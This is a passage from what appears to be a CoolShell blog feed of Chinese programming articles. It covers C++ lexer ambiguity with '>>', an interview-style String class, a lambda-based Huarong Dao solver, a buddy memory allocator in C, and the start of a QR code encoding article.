<p>​经过词法分析会得到[(Type, “int”), (Identifier, “a”), (AssignOperator, “=”), (IntLiteral, 10)]，在后续的语法分析阶段，就会根据这些词法元素匹配相应的语法规则。在我学习编译原理时，教科书中对于词法分析的介绍主要是基于正则表达式的，言下之意就是普通语言的词法规则是可以通过正则表达式描述的。比如，C语言的变量名规则是“包含字母、数字或下划线，并且以字母或下划线开头”，这就可以用正则表达式<code>[a-zA-Z_][a-zA-Z0-9_]*</code>表达。但是，在实践中我发现不管是主流语言，还是自己设计的DSL都大量存在不能简单通过正则表达式进行词法分析的例子。来看C++98的模版例子：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">map&lt;int, vector&lt;int&gt;&gt;
</pre>
<p>上面这段代码会被C++98编译器中报语法错误，原因在于它把“&gt;&gt;”识别成了位右移运算符而不是两个模版右括号，在C++98中必须在两个括号中间加空格，写成</p>
<p><span id="more-10449"></span></p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">map&lt;int, vector&lt;int&gt; &gt;
</pre>
<p>除此了C++模版，据我所知，经典的FORTRAN语言的语法规则更是大量存在词法歧义。</p>
<p>我认为从本质上讲，这类问题的根源在于词法分析的依据只是简单的词法规则，并不具备所有的语法信息，而词法歧义必须提升一层在语法规则中消除。所以，在我自己设计一些DSL的时候干脆就把词法分析和语法分析合二为一了，相当于让语法分析在字符层次上去进行，而不是经典的词法元素层次上，这就是所谓的<a title="Scannerless Parsing" href="https://en.wikipedia.org/wiki/Scannerless_parsing">Scannerless Parsing</a>。采用这种方法的例子并不少见，TeX, Wiki, Makefile和Perl 6等语言的语法分析器都属此类。</p>
<p>Scannerless Parsing方法弥补了词法规则无法消歧的问题，但是同时也破坏了词法和语法分析简单清晰的管道结构，总体上增加了实现和理解的复杂度。另外，像C++这样大型的语言，如果开始是有词法分析的，稍微碰到一个歧义就整个转成Scannerless Parsing未免也显得太夸张了。这个问题困扰了我很久，直到最近才找到了一个满意的解决方案。还是以上面”&gt;&gt;”为例，我们知道现在C++11已经允许不加空格了，那么C++11编译器是如何处理这个词法歧义的呢？答案是：词法分析阶段既然分析不好”&gt;&gt;”，干脆就不分析了，直接把”&gt;” “&gt;”交给语法分析器来分析，其他没有词法歧义的照旧。当我知道这个方案的时候不由得感叹：妙！理论上，词法分析是可以什么也不做的，全部把字符一一交给语法分析器也没有问题，所以，干脆让词法分析只做有把握的部分，解决不了的交给语法分析器，这样就既保留了管道结构，又解决了词法歧义。</p>
<p>下面我们再来看看C++11规范关于这个问题的定义：</p>
<blockquote>
<p>14.2 Names of template specializations [temp.names] ###</p>
<p>After name lookup (3.4) finds that a name is a template-name or that an operator-function-id or a literal-operator-id refers to a set of overloaded functions any member of which is a function template if this is followed by a &lt;, the &lt; is always taken as the delimiter of a template-argument-list and never as the less-than operator. When parsing a template-argument-list, the first non-nested &gt; is taken as the ending delimiter rather than a greater-than operator. Similarly, the first non-nested &gt;&gt; is treated as two consecutive but distinct &gt; tokens, the first of which is taken as the end of the template-argument-list and completes the template-id. [ Note: The second &gt; token produced by this replacement rule may terminate an enclosing template-id construct or it may be part of a different construct (e.g. a cast).—end note ]</p>
</blockquote>
<p>可见，在C++11中，词法分析器是把”&gt;&gt;”直接当成两个”&gt;”传给了语法分析器，然后在语法分析中如果匹配了template-argument-lis语法，第一个”&gt;”符号会被直接认为是模版结束符，而不是大于，也不是位移符号。根据这个定义，我构造了一个例子：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">template&lt;int N&gt;
class Foo {
};

Foo&lt;3&gt;&gt;1&gt; foo;
</pre>
<p>这个例子在C++98中是能正确编译的，”&gt;&gt;”被解释成了位移运算，但是它反而不能在C++11中编译了，因为根据规范第一个”&gt;”被解释成了模版参数结束符。如果要在C++11中编译，需要显式地加上括号：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">Foo&lt;(3&gt;&gt;1)&gt; foo;
</pre>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-02T18:47:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/10449.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++面试中string类的一种正确写法 ]]></title>
<link>https://coolshell.cn/articles/10478.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 <a href="https://weibo.com/u/1701018393?source=webim" target="_blank"><img alt="image placeholder" ></a><a title="bnu_chenshuo" href="https://weibo.com/u/1701018393?source=webim" target="_blank"> @bnu_chenshuo </a>投稿）</strong></p>
<p>C++ 的一个常见面试题是让你实现一个 String 类，限于时间，不可能要求具备 std::string 的功能，但至少要求能正确管理资源。具体来说：</p>
<ol>
<li>能像 int 类型那样定义变量，并且支持赋值、复制。</li>
<li>能用作函数的参数类型及返回类型。</li>
<li>能用作标准库容器的元素类型，即 vector/list/deque 的 value_type。（用作 std::map 的 key_type 是更进一步的要求，本文从略）。</li>
</ol>
<p>换言之，你的 String 能让以下代码编译运行通过，并且没有内存方面的错误。</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">void foo(String x)
{
}

void bar(const String&amp; x)
{
}

String baz()
{
  String ret("world");
  return ret;
}

int main()
{
  String s0;
  String s1("hello");
  String s2(s0);
  String s3 = s1;
  s2 = s1;

  foo(s1);
  bar(s1);
  foo("temporary");
  bar("temporary");
  String s4 = baz();

  std::vector&lt;String&gt; svec;
  svec.push_back(s0);
  svec.push_back(s1);
  svec.push_back(baz());
  svec.push_back("good job");
}</pre>
<p><span id="more-10478"></span>本文给出我认为适合面试的答案，强调正确性及易实现（白板上写也不会错），不强调效率。某种意义上可以说是以时间（运行快慢）换空间（代码简洁）。</p>
<p>首先选择数据成员，最简单的 String 只有一个 char* 成员变量。好处是容易实现，坏处是某些操作的复杂度较高（例如 size() 会是线性时间）。为了面试时写代码不出错，本文设计的 String 只有一个 char* data_成员。而且规定 invariant 如下：一个 valid 的 string 对象的 data_ 保证不为 NULL，data_ 以 <code>'\0'</code> 结尾，以方便配合 C 语言的 str*() 系列函数。</p>
<p>其次决定支持哪些操作，构造、析构、拷贝构造、赋值这几样是肯定要有的（以前合称 big three，现在叫 copy control）。如果钻得深一点，C++11的移动构造和移动赋值也可以有。为了突出重点，本文就不考虑 operator[] 之类的重载了。</p>
<p>这样代码基本上就定型了：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">#include &lt;utility&gt;
#include &lt;string.h&gt;

class String
{
 public:
  String()
    : data_(new char[1])
  {
    *data_ = '\0';
  }

  String(const char* str)
    : data_(new char[strlen(str) + 1])
  {
    strcpy(data_, str);
  }

  String(const String&amp; rhs)
    : data_(new char[rhs.size() + 1])
  {
    strcpy(data_, rhs.c_str());
  }
  /* Delegate constructor in C++11
  String(const String&amp; rhs)
    : String(rhs.data_)
  {
  }
  */

  ~String()
  {
    delete[] data_;
  }

  /* Traditional:
  String&amp; operator=(const String&amp; rhs)
  {
    String tmp(rhs);
    swap(tmp);
    return *this;
  }
  */
  String&amp; operator=(String rhs) // yes, pass-by-value
  {
    swap(rhs);
    return *this;
  }

  // C++ 11
  String(String&amp;&amp; rhs)
    : data_(rhs.data_)
  {
    rhs.data_ = nullptr;
  }

  String&amp; operator=(String&amp;&amp; rhs)
  {
    swap(rhs);
    return *this;
  }

  // Accessors

  size_t size() const
  {
    return strlen(data_);
  }

  const char* c_str() const
  {
    return data_;
  }

  void swap(String&amp; rhs)
  {
    std::swap(data_, rhs.data_);
  }

 private:
  char* data_;
};</pre>
<p>注意代码的几个要点：</p>
<ol>
<li>只在构造函数里调用 new char[]，只在析构函数里调用 delete[]。</li>
<li>赋值操作符采用了《C++编程规范》推荐的现代写法。</li>
<li>每个函数都只有一两行代码，没有条件判断。</li>
<li>析构函数不必检查 data_ 是否为 NULL。</li>
<li>构造函数 <code>String(const char* str)</code> 没有检查 str 的合法性，这是一个永无止境的争论话题。这里在初始化列表里就用到了 str，因此在函数体内用 assert() 是无意义的。</li>
</ol>
<p>这恐怕是最简洁的 String 实现了。</p>
<p><strong>练习1</strong>：增加 operator==、operator&lt;、operator[] 等操作符重载。</p>
<p><strong>练习2</strong>：实现一个带 int size_; 成员的版本，以空间换时间。</p>
<p><strong>练习3</strong>：受益于右值引用及移动语意，在 C++11 中对 String 实施直接插入排序的性能比C++98/03要高，试编程验证之。（g++的标准库也用到了此技术。）</p>
<p>陈皓注：同时，大家可以移步看看我的一篇老文《<a href="http://blog.csdn.net/haoel/article/details/1491219" target="_blank">STL中String类的问题</a>》</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-09T15:40:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/10478.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++11的Lambda使用一例：华容道求解 ]]></title>
<link>https://coolshell.cn/articles/10476.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 <a href="https://weibo.com/u/1701018393?source=webim" target="_blank"><img alt="image placeholder" ></a><a title="bnu_chenshuo" href="https://weibo.com/u/1701018393?source=webim" target="_blank"> @bnu_chenshuo </a>投稿）</strong></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>华容道是一个有益的智力游戏，游戏规则不再赘述。用计算机求解华容道也是一道不错的编程练习题，为了寻求最少步数，求解程序一般用广度优先搜索算法。华容道的一种常见开局如图 1 所示。</p>
<p>广度优先搜索算法求解华容道的基本步骤：</p>
<ol>
<li>准备两个“全局变量”，队列 Q 和和集合 S，S 代表“已知局面”。初时 Q 和 S 皆为空。</li>
<li>将初始局面加入队列 Q 的末尾，并将初始局面设为已知。</li>
<li>当队列不为空时，从 Q 的队首取出当前局面 <code>curr</code>。如果队列为空则结束搜索，表明无解。</li>
<li>如果 <code>curr</code> 是最终局面（曹操位于门口，图 2），则结束搜索，否则继续到第 5 步。</li>
<li>考虑 <code>curr</code> 中每个可以移动的棋子，试着上下左右移动一步，得到新局面 <code>next</code>，如果新局面未知（<code>next</code> ∉ S），则把它加入队列 Q，并设为已知。这一步可能产生多个新局面。</li>
<li>回到第2步。</li>
</ol>
<p>其中“局面已知”并不要求每个棋子的位置相同，而是指棋子的投影的形状相同（代码中用 mask 表示），例如交换图 1 中的张飞和赵云并不产生新局面，这一规定可以大大缩小搜索空间。</p>
<p>以上步骤很容易转换为 C++ 代码，这篇文章重点关注的是第 5 步的实现。</p>
<p><span id="more-10476"></span></p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// 第 1 步
std::unordered_set&lt;Mask&gt; seen;
std::deque&lt;State&gt; queue;

// 第 2 步
State initial;
// 填入 initial，略。
queue.push_back(initial);
seen.insert(initial.toMask());

// 第 3 步
while (!queue.empty())
{
  const State curr = queue.front();
  queue.pop_front();

  // 第 4 步
  if (curr.isSolved())
    break;

  // 第 5 步
  for (const State&amp; next : curr.moves())
  {
    auto result = seen.insert(next.toMask());
    if (result.second)
      queue.push_back(next);
  }
}</pre>
<p>在以上原始实现中，<code>curr.move()</code> 将返回一个 <code>std::vector&lt;State&gt;</code> 临时对象。一种节省开销的办法是准备一个 <code>std::vector&lt;State&gt;</code> “涂改变量”，让 <code>curr.move()</code> 反复修改它，比如改成：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// 第 1 步新增一个 scratch 变量
std::vector&lt;State&gt; nextMoves;

// 第 3 步
while (!queue.empty())
{
  // ...
  // 第 5 步
  curr.fillMoves(&amp;nextMoves);
  for (const State&amp; next : nextMoves)
  { /* 略 */ }
}</pre>
<p>还有一种彻底不用这个 <code>std::vector&lt;State&gt;</code> 的办法，把一部分逻辑以 lambda 的形式传给 <code>curr.move()</code>，代码的结构基本不变：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">// 第 3 步
while (!queue.empty())
{
  // ...
  // 第 5 步
  curr.move([&amp;seen, &amp;queue](const State&amp; next) {
    auto result = seen.insert(next.toMask());
    if (result.second)
      queue.push_back(next);
  });
}</pre>
<p>这样一来，主程序的逻辑依然清晰，不必要的开销也降到了最小。</p>
<p>在我最早的实现中，<code>curr.move()</code> 的参数是 <code>const std::function&lt;void(const State&amp;)&gt; &amp;</code>，但是我发现这里每次构造 <code>std::function&lt;void(const State&amp;)&gt;</code> 对象都会分配一次内存，似乎有些不值。因此在现在的实现中 <code>curr.move()</code> 是个函数模板，这样就能自动匹配lambda参数（通常是个 struct 对象），省去了 <code>std::function</code>的内存分配。</p>
<p>本文完整的代码见 <a href="https://github.com/chenshuo/recipes/blob/master/puzzle/huarong.cc">https://github.com/chenshuo/recipes/…/puzzle/huarong.cc</a>，需用 GCC 4.7 编译，求解图 1 的题目的耗时约几十毫秒。</p>
<p><strong>练习：</strong>修改程序，打印每一步移动棋子的情况。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-09T15:50:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/10476.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 伙伴分配器的一个极简实现 ]]></title>
<link>https://coolshell.cn/articles/10427.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>提起buddy system相信很多人不会陌生，它是一种经典的内存分配算法，大名鼎鼎的Linux底层的内存管理用的就是它。这里不探讨内核这么复杂实现，而仅仅是将该算法抽象提取出来，同时给出一份及其简洁的源码实现，以便定制扩展。</p>
<p>伙伴分配的实质就是一种特殊的<strong>“分离适配”</strong>，即将内存按2的幂进行划分，相当于分离出若干个块大小一致的空闲链表，搜索该链表并给出同需求最佳匹配的大小。其优点是快速搜索合并（O(logN)时间复杂度）以及低外部碎片（最佳适配best-fit）；其缺点是内部碎片，因为按2的幂划分块，如果碰上66单位大小，那么必须划分128单位大小的块。但若需求本身就按2的幂分配，比如可以先分配若干个内存池，在其基础上进一步细分就很有吸引力了。</p>
<p>可以在<a href="https://en.wikipedia.org/wiki/Buddy_memory_allocation" target="_blank">维基百科</a>上找到该算法的描述，大体如是：</p>
<p><strong>分配内存：</strong></p>
<p>1.寻找大小合适的内存块（大于等于所需大小并且最接近2的幂，比如需要27，实际分配32）</p>
<p style="padding-left: 30px;">1.如果找到了，分配给应用程序。<br>
2.如果没找到，分出合适的内存块。</p>
<p style="padding-left: 60px;">1.对半分离出高于所需大小的空闲内存块<br>
2.如果分到最低限度，分配这个大小。<br>
3.回溯到步骤1（寻找合适大小的块）<br>
4.重复该步骤直到一个合适的块</p>
<p><span id="more-10427"></span></p>
<p><strong>释放内存：</strong></p>
<p>1.释放该内存块</p>
<p style="padding-left: 30px;">1.寻找相邻的块，看其是否释放了。<br>
2.如果相邻块也释放了，合并这两个块，重复上述步骤直到遇上未释放的相邻块，或者达到最高上限（即所有内存都释放了）。</p>
<p>上面这段文字对你来说可能看起来很费劲，没事，我们看个内存分配和释放的示意图你就知道了：</p>
<p><img alt="image placeholder" ></p>
<p>上图中，首先我们假设我们一个内存块有1024K，当我们需要给A分配70K内存的时候，</p>
<ol>
<li>我们发现1024K的一半大于70K，然后我们就把1024K的内存分成两半，一半512K。</li>
<li>然后我们发现512K的一半仍然大于70K，于是我们再把512K的内存再分成两半，一半是128K。</li>
<li>此时，我们发现128K的一半小于70K，于是我们就分配为A分配128K的内存。</li>
</ol>
<p>后面的，B，C，D都这样，而释放内存时，则会把相邻的块一步一步地合并起来（合并也必需按分裂的逆操作进行合并）。</p>
<p>我们可以看见，这样的算法，用二叉树这个数据结构来实现再合适不过了。</p>
<p>我在网上分别找到<a href="https://github.com/cloudwu/buddy" target="_blank">cloudwu</a>和<a href="https://github.com/wuwenbin/buddy2">wuwenbin</a>写的两份开源实现和测试用例。实际上后一份是对前一份的精简和优化，本文打算从后一份入手讲解，<strong>因为这份实现真正体现了“极简”二字，追求突破常规的，极致简单的设计。</strong>网友对其评价甚高，甚至可用作教科书标准实现，看完之后回过头来看cloudwu的代码就容易理解了。</p>
<p>分配器的整体思想是，通过一个数组形式的完全二叉树来监控管理内存，二叉树的节点用于标记相应内存块的使用状态，高层节点对应大的块，低层节点对应小的块，在分配和释放中我们就通过这些节点的标记属性来进行块的分离合并。如图所示，假设总大小为16单位的内存，我们就建立一个深度为5的满二叉树，根节点从数组下标[0]开始，监控大小16的块；它的左右孩子节点下标[1~2]，监控大小8的块；第三层节点下标[3~6]监控大小4的块……依此类推。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>在分配阶段，首先要搜索大小适配的块，假设第一次分配3，转换成2的幂是4，我们先要对整个内存进行对半切割，从16切割到4需要两步，那么从下标[0]节点开始深度搜索到下标[3]的节点并将其标记为已分配。第二次再分配3那么就标记下标[4]的节点。第三次分配6，即大小为8，那么搜索下标[2]的节点，因为下标[1]所对应的块被下标[3~4]占用了。</p>
<p>在释放阶段，我们依次释放上述第一次和第二次分配的块，即先释放[3]再释放[4]，当释放下标[4]节点后，我们发现之前释放的[3]是相邻的，于是我们立马将这两个节点进行合并，这样一来下次分配大小8的时候，我们就可以搜索到下标[1]适配了。若进一步释放下标[2]，同[1]合并后整个内存就回归到初始状态。</p>
<p>还是看一下源码实现吧，首先是伙伴分配器的数据结构：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct buddy2 {
  unsigned size;
  unsigned longest[1];
};</pre>
<p>这里的成员size表明管理内存的总单元数目（测试用例中是32），成员longest就是二叉树的节点标记，表明所对应的内存块的空闲单位，<strong>在下文中会分析这是整个算法中最精妙的设计。</strong>此处数组大小为1表明这是可以向后扩展的（注：在GCC环境下你可以写成longest[0]，不占用空间，这里是出于可移植性考虑），我们在分配器初始化的buddy2_new可以看到这种用法。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct buddy2* buddy2_new( int size ) {
  struct buddy2* self;
  unsigned node_size;
  int i;

  if (size &lt; 1 || !IS_POWER_OF_2(size))
    return NULL;

  self = (struct buddy2*)ALLOC( 2 * size * sizeof(unsigned));
  self-&gt;size = size;
  node_size = size * 2;

  for (i = 0; i &lt; 2 * size - 1; ++i) {
    if (IS_POWER_OF_2(i+1))
      node_size /= 2;
    self-&gt;longest[i] = node_size;
  }
  return self;
}</pre>
<p>整个分配器的大小就是满二叉树节点数目，即所需管理内存单元数目的2倍。一个节点对应4个字节，longest记录了节点所对应的的内存块大小。</p>
<p>内存分配的alloc中，入参是分配器指针和需要分配的大小，返回值是内存块索引。alloc函数首先将size调整到2的幂大小，并检查是否超过最大限度。然后进行适配搜索，深度优先遍历，当找到对应节点后，<strong>将其longest标记为0，即分离适配的块出来，</strong>并转换为内存块索引offset返回，依据二叉树排列序号，比如内存总体大小32，我们找到节点下标[8]，内存块对应大小是4，则offset = (8+1)*4-32 = 4，那么分配内存块就从索引4开始往后4个单位。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int buddy2_alloc(struct buddy2* self, int size) {
  unsigned index = 0;
  unsigned node_size;
  unsigned offset = 0;

  if (self==NULL)
    return -1;

  if (size &lt;= 0)
    size = 1;
  else if (!IS_POWER_OF_2(size))
    size = fixsize(size);

  if (self-&gt;longest[index] &lt; size)
    return -1;

  for(node_size = self-&gt;size; node_size != size; node_size /= 2 ) {
    if (self-&gt;longest[LEFT_LEAF(index)] &gt;= size)
      index = LEFT_LEAF(index);
    else
      index = RIGHT_LEAF(index);
  }

  self-&gt;longest[index] = 0;
  offset = (index + 1) * node_size - self-&gt;size;

  while (index) {
    index = PARENT(index);
    self-&gt;longest[index] =
      MAX(self-&gt;longest[LEFT_LEAF(index)], self-&gt;longest[RIGHT_LEAF(index)]);
  }

  return offset;
}</pre>
<p>在函数返回之前需要回溯，因为小块内存被占用，大块就不能分配了，比如下标[8]标记为0分离出来，那么其父节点下标[0]、[1]、[3]也需要相应大小的分离。<strong>将它们的longest进行折扣计算，取左右子树较大值，</strong>下标[3]取4，下标[1]取8，下标[0]取16，表明其对应的最大空闲值。</p>
<p>在内存释放的free接口，我们只要传入之前分配的内存地址索引，并确保它是有效值。之后就跟alloc做反向回溯，从最后的节点开始一直往上找到longest为0的节点，即当初分配块所适配的大小和位置。<strong>我们将longest恢复到原来满状态的值。继续向上回溯，检查是否存在合并的块，依据就是左右子树longest的值相加是否等于原空闲块满状态的大小，如果能够合并，就将父节点longest标记为相加的和</strong>（多么简单！）。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void buddy2_free(struct buddy2* self, int offset) {
  unsigned node_size, index = 0;
  unsigned left_longest, right_longest;

  assert(self &amp;&amp; offset &gt;= 0 &amp;&amp; offset &lt; size);

  node_size = 1;
  index = offset + self-&gt;size - 1;

  for (; self-&gt;longest[index] ; index = PARENT(index)) {
    node_size *= 2;
    if (index == 0)
      return;
  }

  self-&gt;longest[index] = node_size;

  while (index) {
    index = PARENT(index);
    node_size *= 2;

    left_longest = self-&gt;longest[LEFT_LEAF(index)];
    right_longest = self-&gt;longest[RIGHT_LEAF(index)];

    if (left_longest + right_longest == node_size)
      self-&gt;longest[index] = node_size;
    else
      self-&gt;longest[index] = MAX(left_longest, right_longest);
  }
}</pre>
<p>上面两个成对alloc/free接口的时间复杂度都是O(logN)，保证了程序运行性能。然而这段程序设计的独特之处就在于<strong>使用加权来标记内存空闲状态，而不是一般的有限状态机，实际上longest既可以表示权重又可以表示状态，状态机就毫无必要了，所谓“少即是多”嘛！</strong>反观cloudwu的实现，将节点标记为UNUSED/USED/SPLIT/FULL四个状态机，反而会带来额外的条件判断和管理实现，而且还不如数值那样精确。从逻辑流程上看，wuwenbin的实现简洁明了如同教科书一般，特别是左右子树的走向，内存块的分离合并，块索引到节点下标的转换都是一步到位，不像cloudwu充斥了大量二叉树的深度和长度的间接计算，让代码变得晦涩难读，这些都是longest的功劳。<strong>一个“极简”的设计往往在于你想不到的突破常规思维的地方。</strong></p>
<p>这份代码唯一的缺陷就是longest的大小是4字节，内存消耗大。但<a href="http://blog.codingnow.com/2011/12/buddy_memory_allocation.html" target="_blank">cloudwu的博客</a>上有人提议用logN来保存值，这样就能实现uint8_t大小了，<strong>看，又是一个“极简”的设计！</strong></p>
<p>说实话，很难在网上找到比这更简约更优雅的buddy system实现了——至少在Google上如此。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-09T23:10:42+08:00</pubDate>
<guid>https://coolshell.cn/articles/10427.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 二维码的生成细节和原理 ]]></title>
<link>https://coolshell.cn/articles/10590.html</link>
<content><![CDATA[ 
<p>二维码又称QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型：比如：字符，数字，日文，中文等等。这两天学习了一下二维码图片生成的相关细节，觉得这个玩意就是一个密码算法，在此写一这篇文章 ，揭露一下。供好学的人一同学习之。</p>
<p>关于QR Code Specification，可参看这个PDF：<a href="http://raidenii.net/files/datasheets/misc/qr_code.pdf" target="_blank">http://raidenii.net/files/datasheets/misc/qr_code.pdf </a></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">基础知识</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%AE%9A%E4%BD%8D%E5%9B%BE%E6%A1%88" title="定位图案">定位图案</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8A%9F%E8%83%BD%E6%80%A7%E6%95%B0%E6%8D%AE" title="功能性数据">功能性数据</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%95%B0%E6%8D%AE%E7%A0%81%E5%92%8C%E7%BA%A0%E9%94%99%E7%A0%81" title="数据码和纠错码">数据码和纠错码</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81" title="数据编码">数据编码</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%A4%BA%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81" title="示例一：数字编码">示例一：数字编码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%A4%BA%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" title="示例二：字符编码">示例二：字符编码</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-8" href="#%E7%BB%93%E6%9D%9F%E7%AC%A6%E5%92%8C%E8%A1%A5%E9%BD%90%E7%AC%A6" title="结束符和补齐符">结束符和补齐符</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%8C%898bits%E9%87%8D%E6%8E%92" title="按8bits重排">按8bits重排</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E8%A1%A5%E9%BD%90%E7%A0%81%EF%BC%88Padding_Bytes%EF%BC%89" title="补齐码（Padding Bytes）">补齐码（Padding Bytes）</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E7%BA%A0%E9%94%99%E7%A0%81" title="纠错码">纠错码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-12" href="#%E6%9C%80%E7%BB%88%E7%BC%96%E7%A0%81" title="最终编码">最终编码</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E7%A9%BF%E6%8F%92%E6%94%BE%E7%BD%AE" title="穿插放置">穿插放置</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#Remainder_Bits" title="Remainder Bits">Remainder Bits</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-15" href="#%E7%94%BB%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9B%BE" title="画二维码图">画二维码图</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-16" href="#Position_Detection_Pattern" title="Position Detection Pattern">Position Detection Pattern</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#Alignment_Pattern" title="Alignment Pattern">Alignment Pattern</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#Timing_Pattern" title="Timing Pattern">Timing Pattern</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#Format_Information" title="Format Information">Format Information</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-20" href="#Version_Information" title="Version Information">Version Information</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-21" href="#%E6%95%B0%E6%8D%AE%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BA%A0%E9%94%99%E7%A0%81" title="数据和数据纠错码">数据和数据纠错码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-22" href="#%E6%8E%A9%E7%A0%81%E5%9B%BE%E6%A1%88" title="掩码图案">掩码图案</a></li>
</ul>
</li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"></span>基础知识<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们先说一下二维码一共有40个尺寸。官方叫版本Version。Version 1是21 x 21的矩阵，Version 2是 25 x 25的矩阵，Version 3是29的尺寸，每增加一个version，就会增加4的尺寸，公式是：(V-1)*4 + 21（V是版本号） 最高Version 40，(40-1)*4+21 = 177，所以最高是177 x 177 的正方形。</p>
<p>下面我们看看一个二维码的样例：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><span id="more-10590"></span></p>
<h5 style="text-align: left;">
